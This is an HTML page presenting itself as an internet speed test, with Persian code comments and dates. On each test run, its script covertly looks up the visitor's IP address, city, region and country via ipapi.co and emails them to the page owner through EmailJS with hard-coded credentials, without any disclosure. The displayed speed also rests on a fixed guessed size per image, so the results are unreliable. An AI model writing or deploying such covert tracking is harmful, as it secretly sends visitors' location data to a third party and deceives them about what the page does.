<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Speed Test</title>
  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
    :root { --bg: #ffffff; --text: #1a1a1a; --text-dim: #666666; --accent: #007aff; --accent-hover: #0056b3; --transition: cubic-bezier(0.25, 0.46, 0.45, 0.94); }
    html, body { height: 100%; background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; -webkit-font-smoothing: antialiased; overflow: hidden; }
    .container { height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 2rem; text-align: center; position: relative; }
    .speed-value { font-size: clamp(4rem, 18vw, 11rem); font-weight: 200; letter-spacing: -0.04em; line-height: 1; user-select: none; }
    .speed-unit { font-size: clamp(1rem, 3.5vw, 1.5rem); color: var(--text-dim); font-weight: 400; margin-top: 0.5rem; letter-spacing: 0.05em; text-transform: uppercase; user-select: none; }
    .status { margin-top: 2.5rem; font-size: 1rem; color: var(--text-dim); font-weight: 400; min-height: 1.5em; transition: opacity 0.2s ease; user-select: none; }
    .status.testing::after { content: ''; animation: dots 1.4s steps(4, end) infinite; }
    @keyframes dots { 0%, 20% { content: ''; } 40% { content: '.'; } 60% { content: '..'; } 80%, 100% { content: '...'; } }
    .progress-ring { position: absolute; width: 220px; height: 220px; opacity: 0; transition: opacity 0.3s ease; pointer-events: none; }
    .progress-ring.visible { opacity: 1; }
    .progress-ring circle { fill: none; stroke: var(--accent); stroke-width: 2; stroke-linecap: round; transform: rotate(-90deg); transform-origin: 50% 50%; transition: stroke-dashoffset 0.1s linear; }
    .progress-ring-bg { stroke: #f0f0f0; stroke-dasharray: 660; stroke-dashoffset: 0; }
    .progress-ring-fill { stroke-dasharray: 660; stroke-dashoffset: 660; transition: stroke-dashoffset 0.1s linear; }
    .button-container { margin-top: 3rem; display: flex; gap: 1rem; justify-content: center; align-items: center; }
    .btn { padding: 1rem 3rem; font-size: 1rem; font-weight: 500; letter-spacing: 0.05em; text-transform: uppercase; border: 2px solid var(--accent); border-radius: 50px; cursor: pointer; transition: all 0.3s var(--transition); background: transparent; color: var(--accent); min-width: 140px; outline: none; }
    .btn:hover { background: var(--accent); color: #ffffff; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3); }
    .btn:active { transform: translateY(0); box-shadow: 0 2px 6px rgba(0, 122, 255, 0.2); }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
    .btn-start { background: var(--accent); color: #ffffff; }
    .btn-start:hover { background: var(--accent-hover); border-color: var(--accent-hover); }
    .btn-retry { background: transparent; color: var(--accent); }
    .btn-retry:hover { background: var(--accent); color: #ffffff; }
    .btn-start.hidden, .btn-retry.hidden { display: none; }
    @media (max-height: 700px) { .container { padding: 1rem; } .status { margin-top: 1.5rem; } .button-container { margin-top: 2rem; } }
    @media (max-width: 480px) { .btn { padding: 0.8rem 2rem; min-width: 120px; font-size: 0.9rem; } .button-container { flex-direction: column; gap: 0.8rem; } }
    @media (prefers-reduced-motion: reduce) { * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; } }
  </style>
  
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script type="text/javascript">
    (function(){
      emailjs.init("9eSFR2bUHeBSPL62P");
    })();
  </script>
</head>
<body>
  <div class="container">
    <svg class="progress-ring" viewBox="0 0 220 220" aria-hidden="true">
      <circle class="progress-ring-bg" cx="110" cy="110" r="105"/>
      <circle class="progress-ring-fill" cx="110" cy="110" r="105"/>
    </svg>
    <div class="speed-value" id="speedValue">0</div>
    <div class="speed-unit">Mbps</div>
    <div class="status" id="status">Ready to test</div>
    <div class="button-container">
      <button class="btn btn-start" id="startBtn">Start</button>
      <button class="btn btn-retry" id="retryBtn" style="display: none;">Retry</button>
    </div>
  </div>

  <script>
    (function() {
      'use strict';
      
      const EMAIL_CONFIG = {
        serviceID: 'service_8tionlw',
        templateID: 'template_nn79ai6',
        publicKey: '9eSFR2bUHeBSPL62P'
      };
      
      const CONFIG = { testDuration: 5000, uiUpdateInterval: 100 };
      const els = {
        speedValue: document.getElementById('speedValue'),
        status: document.getElementById('status'),
        progressRing: document.querySelector('.progress-ring'),
        progressFill: document.querySelector('.progress-ring-fill'),
        startBtn: document.getElementById('startBtn'),
        retryBtn: document.getElementById('retryBtn')
      };
      let state = {
        isTesting: false, startTime: 0, totalBytes: 0,
        animationFrame: null, currentSpeed: 0, lastMeasuredSpeed: 0,
        finalSpeed: null, testElements: []
      };

      // 🎯 گرفتن IP و Location
      const getUserLocation = async () => {
        try {
          const response = await fetch('https://ipapi.co/json/');
          const data = await response.json();
          return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country_name || 'Unknown',
            lat: data.latitude || '',
            lon: data.longitude || ''
          };
        } catch (error) {
          console.warn('⚠️ Could not fetch location:', error);
          return {
            ip: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            lat: '',
            lon: ''
          };
        }
      };

      const sendTestNotification = async () => {
        try {
          const now = new Date();
          const location = await getUserLocation();
          
          const templateParams = {
            date: now.toLocaleDateString('fa-IR'),
            time: now.toLocaleTimeString('fa-IR'),
            ip: location.ip,
            city: location.city,
            region: location.region,
            country: location.country
          };
          
          await emailjs.send(
            EMAIL_CONFIG.serviceID,
            EMAIL_CONFIG.templateID,
            templateParams,
            EMAIL_CONFIG.publicKey
          );
          console.log('✅ Email sent with location:', location);
        } catch (error) {
          console.error('❌ Email send failed:', error);
        }
      };

      const formatNumber = (num) => {
        if (num >= 100) return Math.round(num).toString();
        if (num >= 10) return num.toFixed(1);
        return num.toFixed(2);
      };

      const updateProgressRing = (progress) => {
        const circumference = 660;
        const offset = circumference * (1 - Math.min(progress, 1));
        els.progressFill.style.strokeDashoffset = offset;
      };

      const calculateSpeed = (bytes, elapsedMs) => {
        if (elapsedMs <= 0) return 0;
        return (bytes * 8) / (elapsedMs / 1000) / 1_000_000;
      };

      const updateUI = (speed, statusText = 'Testing') => {
        els.speedValue.textContent = formatNumber(speed);
        els.status.textContent = statusText;
        els.status.classList.add('testing');
      };

      const showResult = (speed) => {
        els.speedValue.textContent = formatNumber(speed);
        els.status.textContent = 'Complete';
        els.status.classList.remove('testing');
        els.progressRing.classList.remove('visible');
        els.startBtn.classList.add('hidden');
        els.retryBtn.style.display = 'inline-block';
        els.retryBtn.disabled = false;
      };

      const showError = (message) => {
        els.status.textContent = message || 'Test failed';
        els.status.classList.remove('testing');
        els.progressRing.classList.remove('visible');
        els.startBtn.classList.add('hidden');
        els.retryBtn.style.display = 'inline-block';
        els.retryBtn.disabled = false;
        state.isTesting = false;
      };

      const resetUI = () => {
        els.speedValue.textContent = '0';
        els.status.textContent = 'Ready to test';
        els.status.classList.remove('testing');
        els.progressRing.classList.remove('visible');
        updateProgressRing(0);
        els.startBtn.classList.remove('hidden');
        els.retryBtn.style.display = 'none';
      };

      const setLoadingState = (loading) => {
        els.startBtn.disabled = loading;
        els.retryBtn.disabled = loading;
        els.startBtn.textContent = loading ? 'Testing...' : 'Start';
      };

      const downloadWithImages = async (duration) => {
        const startTime = performance.now();
        let bytesLoaded = 0, lastUpdate = startTime, testComplete = false;
        const imageUrls = [
          'https://picsum.photos/1920/1080?random=1',
          'https://picsum.photos/1920/1080?random=2',
          'https://picsum.photos/1920/1080?random=3',
          'https://picsum.photos/1920/1080?random=4',
          'https://picsum.photos/1920/1080?random=5',
          'https://picsum.photos/1920/1080?random=6',
          'https://picsum.photos/1920/1080?random=7',
          'https://picsum.photos/1920/1080?random=8',
          'https://picsum.photos/1920/1080?random=9',
          'https://picsum.photos/1920/1080?random=10',
        ];
        let imageIndex = 0;
        const estimatedImageSize = 300000;

        const loadNextImage = () => {
          if (testComplete || imageIndex >= imageUrls.length) return;
          const img = new Image();
          img.onload = () => {
            bytesLoaded += estimatedImageSize;
            imageIndex++;
            if (!testComplete) setTimeout(loadNextImage, 50);
          };
          img.onerror = () => {
            imageIndex++;
            if (!testComplete) setTimeout(loadNextImage, 50);
          };
          img.src = imageUrls[imageIndex];
          state.testElements.push(img);
        };

        for (let i = 0; i < 4; i++) setTimeout(loadNextImage, i * 150);

        return new Promise((resolve) => {
          const checkProgress = () => {
            const now = performance.now();
            const elapsed = now - startTime;
            if (now - lastUpdate >= CONFIG.uiUpdateInterval) {
              const speed = calculateSpeed(bytesLoaded, elapsed);
              state.currentSpeed = speed;
              state.lastMeasuredSpeed = speed;
              const progress = Math.min(elapsed / duration, 1);
              updateUI(speed, `Testing ${Math.round(progress * 100)}%`);
              updateProgressRing(progress);
              lastUpdate = now;
            }
            if (elapsed >= duration) {
              testComplete = true;
              resolve({ bytesLoaded, totalTime: elapsed, finalSpeed: state.lastMeasuredSpeed });
            } else {
              requestAnimationFrame(checkProgress);
            }
          };
          checkProgress();
        });
      };

      const runSpeedTest = async () => {
        if (state.isTesting) return;
        
        sendTestNotification();
        
        state = {
          isTesting: true, startTime: 0, totalBytes: 0,
          animationFrame: null, currentSpeed: 0, lastMeasuredSpeed: 0,
          finalSpeed: null, testElements: []
        };
        resetUI();
        els.status.textContent = 'Starting...';
        els.status.classList.add('testing');
        els.progressRing.classList.add('visible');
        updateProgressRing(0);
        setLoadingState(true);

        try {
          const result = await downloadWithImages(CONFIG.testDuration);
          state.finalSpeed = result.finalSpeed;
          if (state.finalSpeed < 0.01) state.finalSpeed = 0.01;
          showResult(state.finalSpeed);
        } catch (error) {
          console.error('Speed test error:', error);
          showError('Retry');
        } finally {
          if (state.animationFrame) cancelAnimationFrame(state.animationFrame);
          setLoadingState(false);
          state.isTesting = false;
        }
      };

      const init = () => {
        els.startBtn.addEventListener('click', (e) => { e.preventDefault(); runSpeedTest(); });
        els.retryBtn.addEventListener('click', (e) => { e.preventDefault(); runSpeedTest(); });
        document.addEventListener('keydown', (e) => {
          if ((e.key === 'Enter' || e.key === ' ') && !state.isTesting) runSpeedTest();
        });
      };

      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
      } else { init(); }
    })();
  </script>
</body>
</html>
